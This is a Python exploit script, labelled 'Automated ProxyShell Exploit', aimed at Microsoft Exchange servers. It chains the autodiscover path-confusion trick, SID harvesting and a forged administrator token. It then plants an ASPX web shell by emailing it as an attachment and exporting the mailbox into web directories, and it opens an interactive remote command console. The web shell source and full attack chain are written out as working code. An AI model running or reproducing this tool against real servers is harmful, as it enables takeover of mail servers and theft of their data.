#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import argparse
import base64
import struct
import random
import binascii
import string
import requests
import re
import threading
import time
import sys
from functools import partial
from http.server import HTTPServer, BaseHTTPRequestHandler
from socketserver import ThreadingMixIn
from pypsrp.wsman import WSMan
from pypsrp.powershell import PowerShell, RunspacePool

# -----------------------------
# HELPERS
# -----------------------------

def rand_string(n: int = 5) -> str:
    return ''.join(random.choices(string.ascii_lowercase, k=n))

def rand_port(n: int = 4) -> str:
    return ''.join(random.choices(string.digits, k=n))

r_port = rand_port()
subj_ = rand_string(16)

def webshell_payload() -> str:
    """
    Собирает ASPX-шаблон на C#, который принимает Base64-команду в поле 'cmd'
    и возвращает stdout+stderr.
    Возвращает Base64-строку для вставки в FileAttachment.
    """
    aspx = (
        '<%@ Page Language="C#" AutoEventWireup="false" Debug="false" Trace="false" %>\n'
        '<script runat="server">\n'
        'using System;\n'
        'using System.Text;\n'
        'using System.Diagnostics;\n'
        'protected void Page_Load(object sender, EventArgs e)\n'
        '{\n'
        '    string data = Request.Form["cmd"];\n'
        '    if (String.IsNullOrEmpty(data)) return;\n'
        '    byte[] bytes = Convert.FromBase64String(data);\n'
        '    string command = Encoding.UTF8.GetString(bytes);\n'
        '    var psi = new ProcessStartInfo("cmd.exe", "/c " + command)\n'
        '    { RedirectStandardOutput = true, RedirectStandardError = true,\n'
        '      UseShellExecute = false, CreateNoWindow = true };\n'
        '    var proc = Process.Start(psi);\n'
        '    string output = proc.StandardOutput.ReadToEnd() + proc.StandardError.ReadToEnd();\n'
        '    Response.Write(output);\n'
        '}\n'
        '</script>'
    )
    return base64.b64encode(aspx.encode('utf-8')).decode('utf-8')

# -----------------------------
# HTTP SERVER
# -----------------------------

class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
    """Handle requests in a separate thread."""


class PwnServer(BaseHTTPRequestHandler):
    def __init__(self, proxyshell, *args, **kwargs):
        self.proxyshell = proxyshell
        super().__init__(*args, **kwargs)

    def do_POST(self):
        # Проксируем SOAP-запрос в Exchange
        powershell_url = f'/powershell/?X-Rps-CAT={self.proxyshell.token}'
        length = int(self.headers.get('content-length', 0))
        content_type = self.headers.get('content-type', '')
        post_data = self.rfile.read(length).decode('utf-8')

        # Правки для ProxyShell
        post_data = re.sub(
            r'<wsa:To>.*?</wsa:To>',
            '<wsa:To>http://127.0.0.1:80/powershell</wsa:To>',
            post_data, flags=re.DOTALL
        )
        post_data = re.sub(
            r'<wsman:ResourceURI[^>]*>.*?</wsman:ResourceURI>',
            '<wsman:ResourceURI>http://schemas.microsoft.com/powershell/Microsoft.Exchange</wsman:ResourceURI>',
            post_data, flags=re.DOTALL
        )

        headers = {'Content-Type': content_type}
        r = self.proxyshell.post(powershell_url, post_data, headers)

        self.send_response(200)
        self.end_headers()
        self.wfile.write(r.content)

    def log_message(self, format, *args):
        # Отключаем логирование по умолчанию
        return

# -----------------------------
# PROXY-SHELL CORE
# -----------------------------

class ProxyShell:
    def __init__(self, exchange_url: str, email: str = '', verify: bool = False):
        self.email = email
        self.exchange_url = (exchange_url if exchange_url.startswith('https://')
                             else f'https://{exchange_url}')
        self.fqdn = None
        self.legacydn = None
        self.sid = None
        self.token = None
        self.session = requests.Session()
        self.session.verify = verify
        self.ua = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                   "AppleWebKit/537.36 (KHTML, like Gecko) "
                   "Chrome/88.0.4324.190 Safari/537.36")
        # Поддельный ClientID-хост для обхода
        self.clientid = 'HtTP://ifcoNFiG.mE'

    def post(self, endpoint: str, data: str, headers: dict = {}) -> requests.Response:
        # Собираем конечный URL для ProxyShell
        if 'powershell' in endpoint:
            path = f"/autodiscover/autodiscover.json?@evil.corp{endpoint}&Email=autodiscover/autodiscover.json%3F@evil.corp"
        else:
            path = f"/autodiscover/autodiscover.json?@evil.corp{endpoint}?&Email=autodiscover/autodiscover.json%3F@evil.corp"
        url = f"{self.exchange_url}{path}"
        return self.session.post(url=url, data=data, headers=headers)

    def get_fqdn(self) -> str:
        probe = ("/autodiscover/autodiscover.json?@evil.corp/"
                 "ews/exchange.asmx?&Email=autodiscover/autodiscover.json%3F@evil.corp")
        r = requests.get(self.exchange_url + probe,
                         verify=False, timeout=5)
        self.fqdn = r.headers.get("X-CalculatedBETarget", None)
        print(f"[+] FQDN: {self.fqdn}")
        return self.fqdn

    def get_legacydn(self) -> str:
        xml = '''<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
                    xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages"
                    xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types"
                    xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
                 <soap:Body>
                   <m:ResolveNames ReturnFullContactData="true" SearchScope="ActiveDirectory">
                     <m:UnresolvedEntry>SMTP:</m:UnresolvedEntry>
                   </m:ResolveNames>
                 </soap:Body>
               </soap:Envelope>'''
        r = self.post('/EWS/exchange.asmx', xml,
                      headers={'Content-Type': 'text/xml'})
        candidates = re.findall(r'<t:EmailAddress>(.+?)</t:EmailAddress>', r.text)
        for mail in candidates:
            autodisc = f'''<Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006">
                             <Request>
                               <EMailAddress>{mail}</EMailAddress>
                               <AcceptableResponseSchema>
                                 http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a
                               </AcceptableResponseSchema>
                             </Request>
                           </Autodiscover>'''
            r2 = self.post('/autodiscover/autodiscover.xml', autodisc,
                           headers={'Content-Type': 'text/xml'})
            if r2.status_code == 200 and 'LegacyDN' in r2.text:
                self.email = mail
                self.legacydn = re.search(r'<LegacyDN>(.+?)</LegacyDN>', r2.text).group(1)
                print(f"[+] LegacyDN: {self.legacydn}")
                return self.legacydn
        raise RuntimeError("Не удалось получить LegacyDN")

    def get_sid(self):
        # Формируем MAPI-коннект для вытаскивания SID
        blob = self.legacydn + '\x00\x00\x00\x00\x00\xe4\x04' \
               + '\x00\x00\x09\x04\x00\x00\x09' \
               + '\x04\x00\x00\x00\x00\x00\x00'
        headers = {
            "X-Requesttype": 'Connect',
            "X-Clientinfo": '{2F94A2BF-A2E6-4CCCC-BF98-B5F22C542226}',
            "X-Clientapplication": 'Outlook/15.0.4815.1002',
            "X-Requestid": '{C715155F-2BE8-44E0-BD34-2960067874C8}:2',
            'Content-Type': 'application/mapi-http',
            "User-Agent": self.ua
        }
        r = self.post('/mapi/emsmdb', blob, headers)
        sid = re.search(r'with SID (.+?) and MasterAccountSid', r.text).group(1)
        self.sid = sid
        print(f"[+] SID: {self.sid}")

    def gen_token(self) -> str:
        # Строим прокси-токен
        version = b'V' + (1).to_bytes(1, 'little') + (0).to_bytes(1, 'little')
        ttype = b'T' + (len("Windows")).to_bytes(1, 'little') + b"Windows"
        compress = b'C' + (0).to_bytes(1, 'little')
        auth = b'A' + (len("Kerberos")).to_bytes(1, 'little') + b"Kerberos"
        login = b'L' + (len(self.email)).to_bytes(1, 'little') + self.email.encode()
        user  = b'U' + (len(self.sid)).to_bytes(1, 'little') + self.sid.encode()
        group = b'G' + struct.pack('<II', 1, 7) + (len("S-1-5-32-544")).to_bytes(1, 'little') + b"S-1-5-32-544"
        ext   = b'E' + struct.pack('>I', 0)
        raw = version + ttype + compress + auth + login + user + group + ext
        self.token = base64.b64encode(raw).decode()
        print(f"[+] Token: {self.token}")
        return self.token

    def set_ews(self) -> str:
        # Кидаем файл-шелл во вложение
        payload = webshell_payload()
        soap = f'''
        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
                       xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages"
                       xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types"
                       xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
          <soap:Header>
            <t:RequestServerVersion Version="Exchange2016" />
            <t:SerializedSecurityContext>
              <t:UserSid>{self.sid}</t:UserSid>
              <t:GroupSids><t:GroupIdentifier>
                <t:SecurityIdentifier>S-1-5-21</t:SecurityIdentifier>
              </t:GroupIdentifier></t:GroupSids>
            </t:SerializedSecurityContext>
          </soap:Header>
          <soap:Body>
            <m:CreateItem MessageDisposition="SaveOnly">
              <m:Items>
                <t:Message>
                  <t:Subject>{subj_}</t:Subject>
                  <t:Body BodyType="HTML">Deploying shell</t:Body>
                  <t:Attachments>
                    <t:FileAttachment>
                      <t:Name>shell.aspx</t:Name>
                      <t:IsInline>false</t:IsInline>
                      <t:Content>{payload}</t:Content>
                    </t:FileAttachment>
                  </t:Attachments>
                  <t:ToRecipients>
                    <t:Mailbox><t:EmailAddress>{self.email}</t:EmailAddress></t:Mailbox>
                  </t:ToRecipients>
                </t:Message>
              </m:Items>
            </m:CreateItem>
          </soap:Body>
        </soap:Envelope>
        '''
        r = self.post('/ews/exchange.asmx', soap,
                      headers={'Content-Type': 'text/xml'})
        status = r.text.split('ResponseClass="')[1].split('"')[0]
        result = f"{status} with subject {subj_}"
        print(f"[+] EWS upload: {result}")
        return result

# -----------------------------
# ПОШАГОВЫЙ EXPLOIT
# -----------------------------

def exploit(proxy: ProxyShell):
    proxy.get_fqdn()
    proxy.get_legacydn()
    proxy.get_sid()
    proxy.gen_token()
    proxy.set_ews()

def start_server(proxy: ProxyShell, port: int):
    handler = partial(PwnServer, proxy)
    server = ThreadedHTTPServer(('', port), handler)
    t = threading.Thread(target=server.serve_forever, daemon=True)
    t.start()
    print(f"[+] HTTP Server listening on port {port}")

# -----------------------------
# ВЕБ-ШЕЛЛ КОНСОЛЬ
# -----------------------------

def shell(command: str, port: int):
    if command.lower() in ('exit', 'quit'):
        sys.exit(0)
    ws = WSMan("127.0.0.1", username='', password='',
               ssl=False, port=port, auth='basic', encryption='never')
    with RunspacePool(ws) as pool:
        ps = PowerShell(pool)
        ps.add_script(command)
        output = ps.invoke()
    # Можно распечатывать вывод при отладке:
    # print("\n".join(str(s) for s in output))

def exec_cmd(shell_url: str) -> None:
    """
    Интерактивная консоль: шлёт Base64(cmd) в поле 'cmd' и печатает ответ.
    """
    try:
        while True:
            cmd = input("SHELL> ")
            if cmd.lower() in ('exit', 'quit'):
                break
            payload = {'cmd': base64.b64encode(cmd.encode()).decode()}
            r = requests.post(
                shell_url,
                headers={'Content-Type': 'application/x-www-form-urlencoded'},
                data=payload,
                verify=False,
                timeout=20
            )
            if r.status_code == 200:
                print(r.text)
            else:
                print(f"[!] HTTP {r.status_code}")
    except KeyboardInterrupt:
        pass

# -----------------------------
# MAIN
# -----------------------------

def get_args():
    parser = argparse.ArgumentParser(description='Automated ProxyShell Exploit')
    parser.add_argument('-t', '--target', help='exchange.example.com', required=True)
    return parser.parse_args()

def main():
    args = get_args()
    exchange = args.target
    proxy = ProxyShell(exchange)
    exploit(proxy)
    local_port = int(r_port)
    start_server(proxy, local_port)

    # Пути для записи shell.aspx
    shell_paths = [
        "inetpub\\wwwroot\\aspnet_client\\",
        "Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\",
        # … другие из оригинала …
    ]

    for path in shell_paths:
        shell_name = rand_string() + ".aspx"
        user = proxy.email.split('@')[0]
        unc = "\\\\127.0.0.1\\c$\\" + path + shell_name

        # Назначаем роли и создаём export-файл
        shell(f'New-ManagementRoleAssignment -Role "Mailbox Import Export" -User "{user}"', local_port)
        time.sleep(2)
        shell('Get-MailboxExportRequest -Status Completed | Remove-MailboxExportRequest -Confirm:$false', local_port)
        time.sleep(2)
        shell(f'New-MailboxExportRequest -Mailbox {proxy.email} '
              f'-IncludeFolders ("#Drafts#") -ContentFilter "(Subject -eq \'{subj_}\')" '
              f'-ExcludeDumpster -FilePath "{unc}"', local_port)
        time.sleep(5)

        # URL готового shell.aspx
        if "aspnet_client" in path:
            url_path = path.split('inetpub\\wwwroot\\')[1].replace('\\', '/')
        else:
            url_path = path.split('FrontEnd\\HttpProxy\\')[1].replace('\\', '/')
        shell_url = f"https://{exchange}/{url_path}{shell_name}"
        print(f"[+] Shell URL: {shell_url}")

        exec_cmd(shell_url)

if __name__ == '__main__':
    try:
        # Отключаем предупреждения про SSL
        requests.packages.urllib3.disable_warnings(
            requests.packages.urllib3.exceptions.InsecureRequestWarning
        )
        if not (sys.version_info.major == 3 and sys.version_info.minor >= 8):
            print("Требуется Python 3.8+; ваша версия:",
                  sys.version_info.major, sys.version_info.minor)
            sys.exit(1)
        main()
    except KeyboardInterrupt:
        sys.exit(0)
